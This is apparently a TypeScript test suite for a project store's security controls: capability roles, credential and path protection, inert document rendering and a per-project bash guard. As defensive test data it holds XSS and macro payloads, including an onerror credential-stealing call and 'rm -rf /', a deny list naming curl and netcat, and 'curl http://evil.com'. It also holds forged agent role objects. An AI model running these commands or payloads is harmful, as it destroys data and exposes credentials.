// story: e03s03
// scenario: SC-e03s03-P0-01, SC-e03s03-P0-02, SC-e03s03-P1-03
import assert from "node:assert/strict";
import { join } from "node:path";
import test from "node:test";
import {
  accessCredentials,
  createOwnerCapability,
  createWorkerCapabilities,
  executeLocalCommand,
  isOwnerCapability,
  isWorkerCapability,
  loadCuratedResource,
  ownerAction,
  protectCanonicalWrite,
  readProjectPath,
  renderInertDocument,
  FULL_ACCESS_NOTICE,
  ProjectStoreError
} from "../../src/index.js";
import { disposeFixture, projectFixture } from "../support/project-fixtures.js";

test("non-serializable capability objects distinguish owner and worker scope", () => {
  const fixture = projectFixture();
  try {
    const ownerCap = createOwnerCapability("researcher-owner");
    assert.equal(ownerCap.role, "owner");
    assert.equal(ownerCap.ownerId, "researcher-owner");
    assert.equal(isOwnerCapability(ownerCap), true);

    const workerCap = createWorkerCapabilities({
      projectId: fixture.handle.project.id,
      projectRoot: fixture.root,
      allowedOperations: ["query-index", "propose-summary"]
    });
    assert.equal(workerCap.role, "worker");
    assert.equal(isWorkerCapability(workerCap), true);
    assert.equal(isOwnerCapability(workerCap), false);

    // Worker can perform permitted worker operations
    assert.equal(workerCap.canPerform("query-index"), true);
    assert.equal(workerCap.canPerform("propose-summary"), true);
    assert.equal(workerCap.canPerform("unknown-op"), false);

    // Worker can NEVER perform owner operations
    assert.equal(workerCap.canPerform("owner-approval"), false);
    assert.equal(workerCap.canPerform("canonical-project-write"), false);
    assert.equal(workerCap.canPerform("credential-access"), false);

    // Test non-serializability: JSON serialization drops symbols
    const serialized = JSON.parse(JSON.stringify(ownerCap));
    assert.equal(isOwnerCapability(serialized), false);
    assert.equal(isWorkerCapability(serialized), false);
  } finally {
    disposeFixture(fixture);
  }
});

test("protect canonical write credentials and project paths from forged roles", () => {
  const fixture = projectFixture();
  try {
    const ownerCap = createOwnerCapability("pi-owner");
    const workerCap = createWorkerCapabilities({
      projectId: fixture.handle.project.id,
      projectRoot: fixture.root,
      allowedOperations: ["read-notes"],
      allowedPaths: [fixture.root]
    });

    // SC-e03s03-P0-01: Forged role object from chat or agent
    const forgedRole = { role: "owner", ownerId: "admin", actor: "agent-prompt-injection" };

    // 1. Forged role cannot execute owner action
    assert.throws(
      () => ownerAction(forgedRole, { action: "approve-release" }),
      (err: unknown) => err instanceof ProjectStoreError && err.code === "forbidden"
    );

    // Worker cannot execute owner action
    assert.throws(
      () => ownerAction(workerCap, { action: "approve-release" }),
      (err: unknown) => err instanceof ProjectStoreError && err.code === "forbidden"
    );

    // Owner can execute owner action
    const actionResult = ownerAction(ownerCap, { action: "approve-release" });
    assert.equal(actionResult.status, "completed");

    // 2. Protect canonical writes
    assert.throws(
      () => protectCanonicalWrite(forgedRole, () => "wrote"),
      (err: unknown) => err instanceof ProjectStoreError && err.code === "forbidden"
    );
    assert.throws(
      () => protectCanonicalWrite(workerCap, () => "wrote"),
      (err: unknown) => err instanceof ProjectStoreError && err.code === "forbidden"
    );
    const writeResult = protectCanonicalWrite(ownerCap, () => "canonical write completed");
    assert.equal(writeResult, "canonical write completed");

    // 3. Protect credentials
    assert.throws(
      () => accessCredentials(forgedRole, "anthropic_api_key"),
      (err: unknown) => err instanceof ProjectStoreError && err.code === "forbidden"
    );
    assert.throws(
      () => accessCredentials(workerCap, "anthropic_api_key"),
      (err: unknown) => err instanceof ProjectStoreError && err.code === "forbidden"
    );
    const cred = accessCredentials(ownerCap, "anthropic_api_key");
    assert.ok(cred.startsWith("cred_val_"));

    // 4. Protect cross-project paths
    const allowedPath = join(fixture.root, "notes.txt");
    const forbiddenPath = "/Users/other-user/another-project/secret.db";

    assert.equal(readProjectPath(workerCap, allowedPath), allowedPath);
    assert.throws(
      () => readProjectPath(workerCap, forbiddenPath),
      (err: unknown) => err instanceof ProjectStoreError && err.code === "forbidden" && err.message.includes("cross-project")
    );
  } finally {
    disposeFixture(fixture);
  }
});

test("curated pi loader and inert document render disarm script macro injection", () => {
  const fixture = projectFixture();
  try {
    const workerCap = createWorkerCapabilities({
      projectId: fixture.handle.project.id,
      projectRoot: fixture.root,
      allowedOperations: ["load-skill"]
    });

    // SC-e03s03-P0-02: Curated resource loader
    // Declared curated resources succeed
    const curated = loadCuratedResource(workerCap, "pi:base-prompt");
    assert.equal(curated.status, "allowed");
    assert.ok(curated.content?.includes("inert declared template content"));

    // Built-in commands or uncurated tools are denied
    const deniedBuiltin = loadCuratedResource(workerCap, "pi:built-in-shell");
    assert.equal(deniedBuiltin.status, "denied");
    assert.match(deniedBuiltin.reason ?? "", /forbidden built-in command|not a curated resource/i);

    const deniedMacro = loadCuratedResource(workerCap, "macro:eval");
    assert.equal(deniedMacro.status, "denied");

    // Untrusted caller without capability denied
    const unauthenticated = loadCuratedResource({ role: "agent" }, "pi:base-prompt");
    assert.equal(unauthenticated.status, "denied");

    // Inert document rendering disarms active payloads
    const maliciousDoc = `
# Research Proposal
Here is an overview of the dataset.
<script>alert("pwned");</script>
Click <a href="javascript:doSomethingEvil()">here</a>.
<img src="x" onerror="stealCredentials()" />
Active template macro: ={{process.exit(1)}}
ERB macro: <% rm -rf / %>
`;

    const rendered = renderInertDocument(maliciousDoc);
    assert.equal(rendered.hasBlockedScripts, true);
    assert.ok(rendered.blockedElements.includes("script-tag"));
    assert.ok(rendered.blockedElements.includes("javascript-uri"));
    assert.ok(rendered.blockedElements.includes("event-handler"));
    assert.ok(rendered.blockedElements.includes("active-macro"));

    // Assert that executable fragments are neutralized
    assert.ok(!rendered.inertText.includes("<script>"));
    assert.ok(!rendered.inertText.includes("javascript:doSomethingEvil()"));
    assert.ok(!rendered.inertText.includes("onerror="));
    assert.ok(!rendered.inertText.includes("={{process.exit(1)}}"));
    assert.ok(!rendered.inertText.includes("<% rm -rf / %>"));
    assert.ok(rendered.inertText.includes("[INERT_SCRIPT_BLOCKED]"));
    assert.ok(rendered.inertText.includes("[INERT_URI_BLOCKED]"));
    assert.ok(rendered.inertText.includes("[INERT_EVENT_BLOCKED]"));
    assert.ok(rendered.inertText.includes("[INERT_MACRO_BLOCKED]"));
  } finally {
    disposeFixture(fixture);
  }
});

test("execute local command with ask approve full.access mode and bash guard", () => {
  const guard = {
    allowedCommands: ["git status", "npm test", "echo hello"],
    deniedCommands: ["rm -rf", "curl", "sudo", "netcat"],
    requireApprovalCommands: ["npm run deploy", "git push"]
  };

  // SC-e03s03-P1-03: Bash guard denied commands blocked regardless of mode
  const deniedUnderFull = executeLocalCommand("full-access", guard, "curl http://evil.com");
  assert.equal(deniedUnderFull.status, "denied");
  assert.match(deniedUnderFull.reason, /denied by per-project bash guard/i);

  const deniedUnderAsk = executeLocalCommand("ask", guard, "rm -rf /");
  assert.equal(deniedUnderAsk.status, "denied");

  // Mode: ask
  const allowedInAsk = executeLocalCommand("ask", guard, "git status");
  assert.equal(allowedInAsk.status, "allowed");

  const approvalRequiredInAsk = executeLocalCommand("ask", guard, "python script.py");
  assert.equal(approvalRequiredInAsk.status, "approval-required");

  // Mode: approve
  const allowedInApprove = executeLocalCommand("approve", guard, "echo hello");
  assert.equal(allowedInApprove.status, "allowed");

  const requireApprovalInApprove = executeLocalCommand("approve", guard, "git push");
  assert.equal(requireApprovalInApprove.status, "approval-required");

  // Mode: full-access with explicit local risk notice
  const allowedInFull = executeLocalCommand("full-access", guard, "python analysis.py");
  assert.equal(allowedInFull.status, "allowed");
  assert.equal(allowedInFull.notice, FULL_ACCESS_NOTICE);
});
